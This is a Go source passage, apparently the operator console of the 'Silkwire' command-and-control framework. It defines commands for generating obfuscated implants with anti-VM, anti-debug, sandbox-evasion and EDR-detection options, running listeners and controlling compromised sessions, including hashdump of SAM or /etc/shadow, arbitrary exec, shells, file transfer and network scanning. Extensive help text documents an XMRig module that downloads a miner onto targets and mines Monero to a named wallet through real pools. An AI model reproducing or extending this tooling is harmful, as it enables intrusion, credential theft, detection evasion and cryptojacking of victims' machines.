	implantsCmd = &cobra.Command{
		Use:   "implants",
		Short: "List all generated implants",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.showImplants()
		},
	}
	rootCmd.AddCommand(implantsCmd)

	// use command to enter session context
	useCmd := &cobra.Command{
		Use:   "use <implant_id>",
		Short: "Enter session interactive mode",
		Long:  "Enter a dedicated session menu for direct interaction with the target",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			fullID := ocGlobal.findImplantID(args[0])
			if fullID == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			session, err := ocGlobal.FindSessionByPartialID(fullID)
			if err != nil {
				fmt.Printf("Error finding session: %v\n", err)
				return
			}
			ocGlobal.startSessionSubprocess(fullID, session.Codename)
		},
	}
	rootCmd.AddCommand(useCmd)

	// session command (alias for 'use' for backward compatibility)
	sessionCmd = &cobra.Command{
		Use:   "session <implant_id>",
		Short: "Enter session interactive mode (alias for 'use')",
		Long:  "Enter a dedicated session menu for direct interaction with the target",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			fullID := ocGlobal.findImplantID(args[0])
			if fullID == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			session, err := ocGlobal.FindSessionByPartialID(fullID)
			if err != nil {
				fmt.Printf("Error finding session: %v\n", err)
				return
			}
			ocGlobal.startSessionSubprocess(fullID, session.Codename)
		},
	}
	rootCmd.AddCommand(sessionCmd)

	// shell <id>
	shellCmd = &cobra.Command{
		Use:   "shell <implant_id>",
		Short: "Start raw interactive PTY with session",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			full := ocGlobal.findImplantID(args[0])
			if full == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			ocGlobal.startLocalPtyShell(full)
		},
	}
	rootCmd.AddCommand(shellCmd)

	// kill <id>
	killCmd = &cobra.Command{
		Use:   "kill <implant_id>",
		Short: "Terminate a session and delete its record",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			full := ocGlobal.findImplantID(args[0])
			if full == "" {
				fmt.Printf("Session not found: %s\n", args[0])
				return
			}
			ocGlobal.KillSession(full)
			if ocGlobal.client != nil {
				if resp, err := ocGlobal.client.DeleteSession(context.Background(), &pb.SessionDeleteRequest{ImplantId: full}); err != nil {
					if st, ok := status.FromError(err); ok && st.Code() == codes.Unimplemented {
						fmt.Println("Server does not support purge via RPC; record may remain until cleanup.")
					} else {
						fmt.Printf("Failed to delete session record: %v\n", err)
					}
				} else if !resp.Success {
					fmt.Printf("Failed to delete session record: %s\n", resp.Message)
				} else {
					fmt.Println("Session record deleted")
				}
			}
		},
	}
	rootCmd.AddCommand(killCmd)

	// exit command
	exitCmd = &cobra.Command{
		Use:   "exit",
		Short: "Exit the console",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println("Goodbye!")
			if ocGlobal != nil {
				ocGlobal.Close()
			}
			os.Exit(0)
		},
	}
	rootCmd.AddCommand(exitCmd)

	// quit command (alias for exit)
	quitCmd = &cobra.Command{
		Use:   "quit",
		Short: "Exit the console",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println("Goodbye!")
			if ocGlobal != nil {
				ocGlobal.Close()
			}
			os.Exit(0)
		},
	}
	rootCmd.AddCommand(quitCmd)

	// listener command with subcommands
	listenerCmd = &cobra.Command{Use: "listener", Short: "Manage listeners"}
	listenerAddCmd = &cobra.Command{
		Use:   "add <host:port> [http|https|mtls] [--cert f --key f --ca f]",
		Short: "Start a new listener",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.handleListenerCommand(append([]string{"add"}, args...))
		},
	}
	listenerLsCmd = &cobra.Command{
		Use:   "ls",
		Short: "List active listeners",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.handleListenerCommand([]string{"ls"})
		},
	}
	listenerRmCmd = &cobra.Command{
		Use:   "rm <id>",
		Short: "Stop a listener",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.handleListenerCommand([]string{"rm", args[0]})
		},
	}
	listenerCmd.AddCommand(listenerAddCmd, listenerLsCmd, listenerRmCmd)
	rootCmd.AddCommand(listenerCmd)

	// generate implant
	generateCmd = &cobra.Command{
		Use:   "generate",
		Short: "Generate implants with options",
		Long: `Generate implants using command-line interface.

Examples:
  generate --mtls 192.168.1.100:8443
  generate --https example.com:443 --os windows --arch amd64
  generate --http 10.0.0.1:80 --format dll --evasion`,
		DisableFlagParsing: true,
		Args:               cobra.ArbitraryArgs,
		ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
			var completions []string

			// If the previous arg was --mtls, --http, or --https, suggest eth0 IP with port
			if len(args) > 0 {
				prevArg := args[len(args)-1]
				if prevArg == "--mtls" || prevArg == "--http" || prevArg == "--https" {
					eth0IP := getEth0IP()
					if eth0IP != "" {
						// Default port suggestions
						defaultPort := "8443"
						if prevArg == "--http" {
							defaultPort = "80"
						} else if prevArg == "--https" {
							defaultPort = "443"
						}
						suggestion := eth0IP + ":" + defaultPort
						if strings.HasPrefix(suggestion, toComplete) || toComplete == "" {
							completions = append(completions, suggestion)
						}
					}
					return completions, cobra.ShellCompDirectiveNoFileComp
				}

				// Autocomplete for other flags based on previous argument
				if prevArg == "--os" {
					osOptions := []string{"windows", "linux", "darwin"}
					for _, opt := range osOptions {
						if strings.HasPrefix(opt, toComplete) {
							completions = append(completions, opt)
						}
					}
					return completions, cobra.ShellCompDirectiveNoFileComp
				}

				if prevArg == "--arch" {
					archOptions := []string{"amd64", "386", "arm64", "arm"}
					for _, opt := range archOptions {
						if strings.HasPrefix(opt, toComplete) {
							completions = append(completions, opt)
						}
					}
					return completions, cobra.ShellCompDirectiveNoFileComp
				}

				if prevArg == "--format" {
					formatOptions := []string{"exe", "dll", "shared", "service"}
					for _, opt := range formatOptions {
						if strings.HasPrefix(opt, toComplete) {
							completions = append(completions, opt)
						}
					}
					return completions, cobra.ShellCompDirectiveNoFileComp
				}
			}

			// Suggest common flags
			flags := []string{
				"--mtls", "--http", "--https", "--dns",
				"--os", "--arch", "--format",
				"--obfuscation-level", "--obf-level",
				"--string-obf", "--name-obf", "--control-flow-obf",
				"--api-obf", "--network-obf",
				"--anti-vm", "--anti-debug", "--sandbox-evasion",
				"--edr-detection", "--sleep-mask",
				"--debug", "--skip-symbols", "--garble",
			}

			for _, flag := range flags {
				if strings.HasPrefix(flag, toComplete) {
					completions = append(completions, flag)
				}
			}

			return completions, cobra.ShellCompDirectiveNoFileComp
		},
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.handleGenerateCommand(args)
		},
	}
	rootCmd.AddCommand(generateCmd)

	// regenerate command
	regenerateCmd = &cobra.Command{
		Use:   "regenerate [flags] <codename>",
		Short: "Regenerate a previously built implant",
		Long: `Regenerate an implant using the configuration from a previous build.

This command looks up a previously generated implant by its codename and
regenerates it with the same configuration. You can optionally save it to
a different location using the --save flag.

Examples:
  regenerate BOLDWOLF
  regenerate --save /tmp/implants SILENTSHARK`,
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			codename := args[0]
			saveDir, _ := cmd.Flags().GetString("save")
			ocGlobal.handleRegenerateCommand(codename, saveDir)
		},
	}
	regenerateCmd.Flags().String("save", "", "Directory to save the regenerated implant")
	rootCmd.AddCommand(regenerateCmd)

	// obfuscation command
	obfuscationCmd := &cobra.Command{
		Use:   "obfuscation",
		Short: "Show obfuscation information and capabilities",
		Long:  "Display comprehensive information about available obfuscation techniques, levels, and usage examples.",
	}

	obfuscationInfoCmd := &cobra.Command{
		Use:   "info",
		Short: "Display detailed obfuscation information",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.showObfuscationInfo()
		},
	}
	obfuscationCmd.AddCommand(obfuscationInfoCmd)
	rootCmd.AddCommand(obfuscationCmd)

	// Hidden command for session subprocess mode
	sessionSubprocessCmd := &cobra.Command{
		Use:    "session-subprocess <implant_id> <codename> <server_addr>",
		Short:  "Start session console as subprocess (internal use)",
		Hidden: true,
		Args:   cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			implantID := args[0]
			codename := args[1]
			serverAddr := args[2]

			// Create session console app
			sessionAppName := fmt.Sprintf("Silkwire %s", colorize(fmt.Sprintf("(%s)", codename), colorRed))
			sessionConsoleApp := rfconsole.New(sessionAppName)

			// Initialize console for subprocess
			c, err := NewOperatorConsole(serverAddr, nil)
			if err != nil {
				log.Printf("Warning: Could not connect to server %s: %v", serverAddr, err)
			}
			ocGlobal = c
			defer c.Close()

			// Set current session context
			currentSessionID = implantID

			// Register this session as known so SESSION_LOST events will be processed
			// The subprocess needs to know about the session it's interacting with
			ocGlobal.notifMux.Lock()
			ocGlobal.knownSessions[implantID] = struct{}{}
			ocGlobal.notifMux.Unlock()

			// Create session menu
			sessionMenu := sessionConsoleApp.NewMenu("")
			sessionMenu.SetCommands(func() *cobra.Command {
				return createSessionMenuCommands()
			})

			// Configure the session prompt with hacker theme
			sessionPrompt := sessionMenu.Prompt()
			sessionPrompt.Primary = func() string {
				return createHackerSessionPrompt(codename)
			}

			// Show session header
			fmt.Printf("\n%s Entering session: %s\n",
				colorize("[*]", colorBlue),
				colorize(implantID, colorYellow))
			fmt.Printf("%s Use %s or %s to return to main console\n\n",
				colorize("[*]", colorBlue),
				colorize("'back'", colorCyan),
				colorize("'exit'", colorCyan))

			// Set global console reference
			ocGlobal.consoleApp = sessionConsoleApp

			// Mark this subprocess as NOT in a session (from notification perspective)
			// This subprocess IS a session, but it needs to show notifications
			ocGlobal.inSessionMux.Lock()
			ocGlobal.inSession = false
			ocGlobal.inSessionMux.Unlock()

			// Start notification display for session console
			go ocGlobal.displayNotifications()

			// Switch to session menu and start console
			sessionConsoleApp.SwitchMenu("")
			_ = sessionConsoleApp.Start()
		},
	}
	rootCmd.AddCommand(sessionSubprocessCmd)

	// Apply colored templates to all commands
	applyColoredTemplates(rootCmd)
}

// applyColoredTemplates recursively applies colored help templates to all commands
func applyColoredTemplates(cmd *cobra.Command) {
	cmd.SetHelpTemplate(getColoredHelpTemplate())
	cmd.SetUsageTemplate(getColoredUsageTemplate())

	for _, subCmd := range cmd.Commands() {
		applyColoredTemplates(subCmd)
	}
}

// createSessionMenuCommands creates the session-related commands
func createSessionMenuCommands() *cobra.Command {
	// If no session is selected, return empty commands
	if currentSessionID == "" {
		return &cobra.Command{
			Use:   "session-menu",
			Short: "No session selected",
		}
	}

	// Find session info for display
	var codename, username, sessionOS string
	if ocGlobal.client != nil {
		resp, err := ocGlobal.client.ListSessions(context.Background(), &pb.SessionListRequest{})
		if err == nil {
			for _, session := range resp.Sessions {
				if session.ImplantId == currentSessionID {
					codename = session.Codename
					username = session.Username
					sessionOS = session.Os
					break
				}
			}
		}
	}

	// Determine if this is a Windows session
	isWindows := strings.ToLower(sessionOS) == "windows"

	// Create session menu root command
	sessionRootCmd := &cobra.Command{
		Use:   "session-menu",
		Short: fmt.Sprintf("Interactive session: %s@%s (%s)", username, codename, currentSessionID),
		Long:  fmt.Sprintf("You are now in session %s (%s@%s). Execute commands directly without session ID.", currentSessionID, username, codename),
	}

	// whoami command
	whoamiCmd := &cobra.Command{
		Use:   "whoami",
		Short: "Show current user on target",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "whoami")
		},
	}
	sessionRootCmd.AddCommand(whoamiCmd)

	// pwd command
	pwdCmd := &cobra.Command{
		Use:   "pwd",
		Short: "Print working directory",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "pwd")
		},
	}
	sessionRootCmd.AddCommand(pwdCmd)

	// ls command
	lsCmd := &cobra.Command{
		Use:   "ls [path]",
		Short: "List directory contents",
		Run: func(cmd *cobra.Command, args []string) {
			command := "ls"
			if len(args) > 0 {
				command += " " + strings.Join(args, " ")
			}
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(lsCmd)

	// ps command
	psCmd := &cobra.Command{
		Use:   "ps",
		Short: "List processes",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "ps")
		},
	}
	sessionRootCmd.AddCommand(psCmd)

	// info command
	infoCmd := &cobra.Command{
		Use:   "info",
		Short: "Display detailed session information",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "info")
		},
	}
	sessionRootCmd.AddCommand(infoCmd)

	// hashdump command
	hashdumpCmd := &cobra.Command{
		Use:   "hashdump",
		Short: "Dump password hashes from SAM database (Windows) or /etc/shadow (Linux)",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "hashdump")
		},
	}
	sessionRootCmd.AddCommand(hashdumpCmd)

	// cat command
	catCmd := &cobra.Command{
		Use:   "cat <file>",
		Short: "Display file contents",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "cat " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(catCmd)

	// shell command
	sessionShellCmd := &cobra.Command{
		Use:   "shell [command]",
		Short: "Execute shell command or start interactive PTY",
		Run: func(cmd *cobra.Command, args []string) {
			if len(args) == 0 {
				ocGlobal.startLocalPtyShell(currentSessionID)
			} else {
				command := "shell " + strings.Join(args, " ")
				ocGlobal.executeSessionCommand(currentSessionID, command)
			}
		},
	}
	sessionRootCmd.AddCommand(sessionShellCmd)

	// exec command for arbitrary commands
	execCmd := &cobra.Command{
		Use:   "exec <command>",
		Short: "Execute arbitrary command",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(execCmd)

	// upload command
	uploadCmd := &cobra.Command{
		Use:   "upload <local> <remote>",
		Short: "Upload local file to target",
		Args:  cobra.ExactArgs(2),
		ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
			if len(args) == 0 {
				// First argument: local file - provide file completion
				return getFileCompletions(toComplete), cobra.ShellCompDirectiveNoSpace
			}
			// Second argument: remote path - no file completion
			return nil, cobra.ShellCompDirectiveNoFileComp
		},
		Run: func(cmd *cobra.Command, args []string) {
			command := fmt.Sprintf("upload %s %s", args[0], args[1])
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(uploadCmd)

	// download command
	downloadCmd := &cobra.Command{
		Use:   "download <remote> <local>",
		Short: "Download remote file to local",
		Args:  cobra.ExactArgs(2),
		ValidArgsFunction: func(cmd *cobra.Command, args []string, toComplete string) ([]string, cobra.ShellCompDirective) {
			if len(args) == 0 {
				// First argument: remote path - no file completion for remote files
				return nil, cobra.ShellCompDirectiveNoFileComp
			}
			// Second argument: local file - provide file completion
			return getFileCompletions(toComplete), cobra.ShellCompDirectiveNoSpace
		},
		Run: func(cmd *cobra.Command, args []string) {
			command := fmt.Sprintf("download %s %s", args[0], args[1])
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(downloadCmd)

	// scan command
	scanCmd := &cobra.Command{
		Use:   "scan",
		Short: "Perform network scan",
		Run: func(cmd *cobra.Command, args []string) {
			// Reconstruct command string from flags
			var cmdBuilder strings.Builder
			cmdBuilder.WriteString("scan")

			if t, _ := cmd.Flags().GetString("target"); t != "" {
				cmdBuilder.WriteString(fmt.Sprintf(" -t %s", t))
			}
			if p, _ := cmd.Flags().GetString("ports"); p != "" {
				cmdBuilder.WriteString(fmt.Sprintf(" -p %s", p))
			}
			if u, _ := cmd.Flags().GetBool("udp"); u {
				cmdBuilder.WriteString(" -u")
			}
			if b, _ := cmd.Flags().GetBool("banner"); b {
				cmdBuilder.WriteString(" -b")
			}
			if th, _ := cmd.Flags().GetInt("threads"); th != 10 {
				cmdBuilder.WriteString(fmt.Sprintf(" --threads %d", th))
			}
			if to, _ := cmd.Flags().GetInt("timeout"); to != 1000 {
				cmdBuilder.WriteString(fmt.Sprintf(" --timeout %d", to))
			}

			ocGlobal.executeSessionCommand(currentSessionID, cmdBuilder.String())
		},
	}
	scanCmd.Flags().StringP("target", "t", "", "Target IP or CIDR (required)")
	scanCmd.Flags().StringP("ports", "p", "", "Comma-separated ports (default: top 20)")
	scanCmd.Flags().BoolP("udp", "u", false, "Scan UDP")
	scanCmd.Flags().BoolP("banner", "b", false, "Grab banners")
	scanCmd.Flags().Int("threads", 10, "Number of threads")
	scanCmd.Flags().Int("timeout", 1000, "Timeout in ms")
	sessionRootCmd.AddCommand(scanCmd)

	// ping command
	pingCmd := &cobra.Command{
		Use:   "ping <target>",
		Short: "Ping a target (ICMP/TCP)",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := fmt.Sprintf("ping %s", args[0])
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}
	sessionRootCmd.AddCommand(pingCmd)

	// ifconfig command
	ifconfigCmd := &cobra.Command{
		Use:   "ifconfig",
		Short: "Show network interfaces",
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "ifconfig")
		},
	}
	sessionRootCmd.AddCommand(ifconfigCmd)

	// Module management commands
	modulesCmd := &cobra.Command{
		Use:   "modules",
		Short: "List available modules",
		Long: `List all available modules with their current status, descriptions, and versions.

Output includes:
  - Module name
  - Description
  - Version
  - Current status (unloaded, loaded, running, stopped, error)
  - Load time and start time if applicable
  
This is equivalent to 'module-list' command.`,
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "module-list")
		},
	}
	sessionRootCmd.AddCommand(modulesCmd)

	// Create parent module command
	moduleCmd := &cobra.Command{
		Use:   "module",
		Short: "Module management commands",
		Long:  `Manage modules for extended functionality like cryptocurrency mining, network tools, and more.`,
	}

	// Load subcommand
	moduleLoadCmd := &cobra.Command{
		Use:   "load <module_name> [key=value ...]",
		Short: "Load and initialize a module for execution",
		Long: `Load a module and prepare it for execution. This command downloads necessary 
binaries, verifies integrity, and initializes the module environment.

Available Modules:
  xmrig    - XMRig cryptocurrency mining module (CPU/GPU mining for Monero and other cryptonote currencies)

Module Details:
  XMRig Module:
    • Downloads the latest XMRig v6.24.0 binary for your platform
    • Supports Linux (x64/ARM64), Windows (x64/x86), and macOS (x64/ARM64)
    • Creates secure working directory in /tmp/xmrig (Linux) or %TEMP%\xmrig (Windows)
    • Verifies binary integrity and sets proper permissions
    • Prepares configuration files and logging infrastructure

Examples:
  module load xmrig                    # Load XMRig module with default settings
  
Loading Process:
  1. Creates isolated working directory for the module
  2. Downloads platform-specific binaries if not present
  3. Verifies binary integrity and executable permissions
  4. Initializes module configuration framework
  5. Sets up logging and monitoring capabilities

Security Notes:
  • Module binaries are downloaded from official GitHub releases
  • All operations are performed in isolated directories
  • Binary integrity is verified before execution
  • Module processes run with standard user privileges

Note: Loading only prepares the module for use. Use 'module start' to begin actual execution.`,
		Args: cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "module-load " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}

	// Start subcommand
	moduleStartCmd := &cobra.Command{
		Use:   "start <module_name> [key=value ...]",
		Short: "Start a loaded module with specified configuration",
		Long: `Start a previously loaded module with runtime configuration parameters.
This begins actual execution of the module with your specified settings.

Available Modules:
  xmrig    - XMRig cryptocurrency mining module for CPU/GPU mining

XMRig Configuration Parameters:
  Required Parameters:
    pool=<address:port>     Mining pool address and port
                           Examples: pool.supportxmr.com:443, gulf.moneroocean.stream:10128
    wallet=<address>        Your cryptocurrency wallet address to receive mining rewards
                           Must be a valid Monero wallet address

  Optional Parameters:
    worker=<name>           Worker/rig identifier for pool statistics (default: silkwire-implant)
                           Useful for tracking multiple miners in pool dashboard
    coin=<currency>         Cryptocurrency to mine (default: monero)
                           Supported: monero, bitcoin, ethereum (check pool compatibility)
    threads=<number>        Number of CPU mining threads (default: auto-detect optimal)
                           Set to 0 for auto-detection, or specify 1-32 for manual control
    tls=<true|false>        Enable TLS/SSL encryption for pool connection (default: false)
                           Recommended for security, especially on public networks
    algo=<algorithm>        Mining algorithm (default: rx/0 for RandomX Monero)
                           Options: rx/0, cn/r, cn/half, cn-pico, argon2/chukwa
    password=<password>     Pool password or additional parameters (default: x)
                           Some pools use this for difficulty settings

Popular Mining Pools:
  SupportXMR:     pool.supportxmr.com:443 (TLS) / pool.supportxmr.com:3333 (non-TLS)
  MoneroOcean:    gulf.moneroocean.stream:10128 (auto-switching)
  Nanopool:       xmr.nanopool.org:14444
  MineXMR:        pool.minexmr.com:4444

Basic Examples:
  module start xmrig pool=pool.supportxmr.com:443 wallet=4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYiRHFcHSGUbhpx5zGMbLGYo3qFaUYiUdZWAZG7r3SpM
  
  module start xmrig pool=gulf.moneroocean.stream:10128 wallet=YOUR_WALLET_ADDRESS coin=monero
  
Advanced Examples:
  # High-performance setup with TLS and custom threads
  module start xmrig pool=pool.supportxmr.com:443 wallet=YOUR_WALLET tls=true threads=8 worker=high-perf-rig
  
  # MoneroOcean auto-switching pool with custom worker name
  module start xmrig pool=gulf.moneroocean.stream:10128 wallet=YOUR_WALLET worker=office-pc coin=monero
  
  # Nanopool with specific algorithm
  module start xmrig pool=xmr.nanopool.org:14444 wallet=YOUR_WALLET algo=rx/0 password=x

Performance Tips:
  • Use threads=0 for auto-detection of optimal thread count
  • Enable TLS (tls=true) for secure connections
  • Choose pools with low latency to your location
  • Use descriptive worker names to track multiple miners

Prerequisites:
  • Module must be loaded first: 'module load xmrig'
  • Valid cryptocurrency wallet address
  • Internet connection for pool communication
  • Sufficient system resources for mining

Note: Mining operations will begin immediately upon successful start. Monitor with 'module status xmrig'.`,
		Args: cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "module-start " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}

	// Stop subcommand
	moduleStopCmd := &cobra.Command{
		Use:   "stop <module_name>",
		Short: "Stop a running module gracefully",
		Long: `Stop a running module gracefully, terminating the process and cleaning up resources.
This command safely shuts down the module while preserving any generated logs or data.

Available Modules:
  xmrig    - XMRig cryptocurrency mining module

Stop Process:
  1. Sends termination signal to the module process
  2. Waits for graceful shutdown (up to 10 seconds)
  3. Forces termination if process doesn't respond
  4. Cleans up process monitoring resources
  5. Updates module status to 'stopped'
  6. Preserves log files and configuration for future use

Examples:
  module stop xmrig                    # Stop XMRig mining module

XMRig-Specific Behavior:
  • Stops all mining threads immediately
  • Completes any pending work submissions to the pool
  • Closes pool connections cleanly
  • Preserves mining statistics in log files
  • Releases CPU/GPU resources back to the system

Safety Features:
  • Process termination is handled gracefully
  • No data corruption or incomplete transactions
  • Mining rewards are not lost (already submitted work is preserved)
  • Log files remain intact for performance analysis
  • Configuration is preserved for future starts

Resource Cleanup:
  • CPU/GPU utilization returns to normal
  • Network connections to mining pools are closed
  • Memory allocated for mining operations is freed
  • File handles and system resources are released

Note: After stopping, the module remains loaded and can be restarted with 'module start xmrig'.
      Use 'module status xmrig' to verify the module has stopped successfully.`,
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "module-stop " + args[0]
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}

	// Status subcommand
	moduleStatusCmd := &cobra.Command{
		Use:   "status <module_name>",
		Short: "Get comprehensive status information about a module",
		Long: `Get detailed real-time status information about a module including running state,
process information, configuration, performance metrics, and operational health.

Available Modules:
  xmrig    - XMRig cryptocurrency mining module

Examples:
  module status xmrig                  # Get current XMRig module status

Status Information Provided:

  Basic Status:
    • Running state (true/false)
    • Module load status (loaded/unloaded/error)
    • Process ID (PID) if currently running
    • Start time and uptime duration
    • Last error message if any

  Configuration Details:
    • Active mining pool address and port
    • Wallet address being used
    • Worker/rig identifier
    • Number of mining threads
    • Mining algorithm and coin type
    • TLS encryption status
    • Pool password configuration

  File Locations:
    • XMRig binary path and version
    • Configuration file location
    • Log file path and size
    • Working directory location

  XMRig-Specific Metrics:
    • Mining pool connection status
    • Active thread count and CPU usage
    • Current hashrate (if available in logs)
    • Pool difficulty and shares submitted
    • Connection uptime to pool
    • Any mining errors or warnings

  Performance Indicators:
    • Process memory usage
    • CPU utilization by mining threads
    • Network connectivity to pool
    • Log file growth rate
    • Recent error conditions

Sample Output Format:
  {
    "running": true,
    "pid": 12345,
    "started_at": "2024-08-20T14:30:00Z",
    "config": {
      "pool": "pool.supportxmr.com:443",
      "wallet": "4AdUnd...",
      "worker": "silkwire-implant",
      "threads": 8,
      "tls": true,
      "coin": "monero"
    },
    "binary_path": "/tmp/xmrig/xmrig",
    "log_file": "/tmp/xmrig/xmrig.log",
    "version": "6.24.0"
  }

Use Cases:
  • Monitor mining performance and health
  • Verify configuration after changes
  • Troubleshoot connection or performance issues
  • Track resource usage and optimization
  • Confirm module state before making changes

Note: Status is retrieved in real-time and reflects the current operational state.
      For detailed mining logs and performance history, check the log files directly.`,
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			command := "module-status " + args[0]
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}

	// Config subcommand
	moduleConfigCmd := &cobra.Command{
		Use:   "config <module_name> <json_config>",
		Short: "Configure a module with JSON configuration data",
		Long: `Configure a module using structured JSON configuration data. This allows for 
precise control over all module parameters and supports hot-reloading for running modules.

Available Modules:
  xmrig    - XMRig cryptocurrency mining module

Configuration Process:
  1. Validates JSON syntax and parameter values
  2. Updates module configuration in memory
  3. If module is running, gracefully stops current instance
  4. Regenerates configuration files with new settings
  5. Automatically restarts module with updated configuration
  6. Verifies successful restart and configuration application

XMRig JSON Configuration Schema:

  Required Fields:
    {
      "pool": "pool_address:port",      // Mining pool endpoint
      "wallet": "wallet_address"        // Your cryptocurrency wallet
    }

  Optional Fields:
    {
      "worker": "worker_name",          // Rig identifier (default: "silkwire-implant")
      "coin": "currency_type",          // Coin to mine (default: "monero")
      "threads": number,                // CPU threads (0 = auto, 1-32 = manual)
      "tls": boolean,                   // Enable TLS encryption (default: false)
      "algo": "algorithm_name",         // Mining algorithm (default: "rx/0")
      "password": "pool_password"       // Pool password (default: "x")
    }

Basic Configuration Examples:

  # Minimal configuration (pool and wallet only)
  module config xmrig '{"pool":"pool.supportxmr.com:443","wallet":"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYiRHFcHSGUbhpx5zGMbLGYo3qFaUYiUdZWAZG7r3SpM"}'

  # Standard configuration with TLS and custom worker
  module config xmrig '{"pool":"pool.supportxmr.com:443","wallet":"YOUR_WALLET","tls":true,"worker":"office-pc"}'

Advanced Configuration Examples:

  # High-performance setup with custom threading
  module config xmrig '{"pool":"gulf.moneroocean.stream:10128","wallet":"YOUR_WALLET","coin":"monero","threads":8,"worker":"high-perf-rig"}'

  # Secure mining with TLS and custom algorithm
  module config xmrig '{"pool":"pool.supportxmr.com:443","wallet":"YOUR_WALLET","tls":true,"threads":0,"worker":"secure-miner","algo":"rx/0"}'

Configuration Parameter Details:

  pool (string, required):
    • Format: "hostname:port" or "ip:port"
    • Examples: "pool.supportxmr.com:443", "gulf.moneroocean.stream:10128"
    • Supports both SSL/TLS and plain text connections

  wallet (string, required):
    • Must be a valid cryptocurrency wallet address
    • For Monero: 95-character address starting with '4'
    • Validates format before accepting configuration

  worker (string, optional):
    • Identifies this miner in pool statistics
    • Alphanumeric characters and hyphens only
    • Default: "silkwire-implant"

  threads (integer, optional):
    • Range: 0-32 (0 = auto-detection)
    • Recommended: Leave at 0 for optimal performance
    • Manual setting useful for resource management

  tls (boolean, optional):
    • true: Use encrypted SSL/TLS connection
    • false: Use plain text connection (default)
    • Recommended: true for security

  coin (string, optional):
    • Supported: "monero", "bitcoin", "ethereum"
    • Default: "monero"
    • Must match pool's supported currencies

  algo (string, optional):
    • Common algorithms: "rx/0", "cn/r", "cn/half"
    • Default: "rx/0" (RandomX for Monero)
    • Must match pool and coin requirements

Hot Configuration Features:
  • Zero-downtime configuration updates
  • Automatic validation of all parameters
  • Rollback to previous config if startup fails
  • Preserves mining statistics and logs
  • Maintains pool connection history

Error Handling:
  • Invalid JSON syntax is rejected with detailed error
  • Missing required fields are identified
  • Invalid parameter values are validated
  • Network connectivity is tested before applying changes
  • Automatic recovery if new configuration fails

Note: Configuration changes are persistent and will be used for future module starts.
      Use 'module status xmrig' to verify configuration was applied successfully.`,
		Args: cobra.MinimumNArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			command := "module-config " + strings.Join(args, " ")
			ocGlobal.executeSessionCommand(currentSessionID, command)
		},
	}

	// List subcommand
	moduleListCmd := &cobra.Command{
		Use:   "list",
		Short: "List available modules",
		Long: `List all available modules with their current status, descriptions, and versions.

Output includes:
  - Module name
  - Description
  - Version
  - Current status (unloaded, loaded, running, stopped, error)
  - Load time and start time if applicable`,
		Run: func(cmd *cobra.Command, args []string) {
			ocGlobal.executeSessionCommand(currentSessionID, "module-list")
		},
	}

	// Add subcommands to parent module command
	moduleCmd.AddCommand(moduleLoadCmd)
	moduleCmd.AddCommand(moduleStartCmd)
	moduleCmd.AddCommand(moduleStopCmd)
	moduleCmd.AddCommand(moduleStatusCmd)
